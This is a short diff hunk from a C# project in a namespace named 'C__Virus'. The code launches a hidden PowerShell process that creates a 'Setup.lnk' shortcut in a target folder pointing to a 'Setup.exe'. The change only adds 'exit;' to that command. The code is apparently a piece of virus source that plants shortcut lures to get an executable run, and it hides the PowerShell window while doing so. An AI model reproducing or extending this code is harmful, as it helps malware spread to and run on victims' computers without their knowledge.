@@ -47,7 +47,7 @@ namespace C__Virus
                         System.Diagnostics.Process process = new System.Diagnostics.Process();
                         System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                         startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-                        string Command = $"$WshShell = New-Object -comObject WScript.Shell;$Shortcut = $WshShell.CreateShortcut('"+Path.Combine(targetPath, "Setup.lnk")+"');$Shortcut.TargetPath = '"+Path.Combine(ExEPath2, "Setup.exe")+"';$Shortcut.Save();";
+                        string Command = $"$WshShell = New-Object -comObject WScript.Shell;$Shortcut = $WshShell.CreateShortcut('"+Path.Combine(targetPath, "Setup.lnk")+"');$Shortcut.TargetPath = '"+Path.Combine(ExEPath2, "Setup.exe")+"';$Shortcut.Save();exit;";
                         startInfo.FileName = "powershell.exe";
                         startInfo.Arguments = $"-Command \"{Command}\"";
                         process.StartInfo = startInfo;
